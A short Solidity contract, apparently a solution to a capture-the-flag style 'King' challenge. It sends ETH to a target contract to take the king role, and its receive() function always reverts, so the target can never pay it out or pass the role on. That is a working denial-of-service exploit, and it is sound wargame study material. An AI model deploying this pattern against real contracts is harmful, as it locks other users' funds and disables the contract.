// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

interface IKing {
    function attack() external;
}

contract KingHack {
    IKing king;

    constructor(address kingContract) {
        king = IKing(kingContract);
    }

    function attack() external payable {
        require(msg.value > 0);
        (bool success, ) = payable(address(king)).call{value: msg.value}("");
        require(success, "Attack failed");
    }

    receive() external payable {
        revert("You cannot transfer ETH here");
    }
}
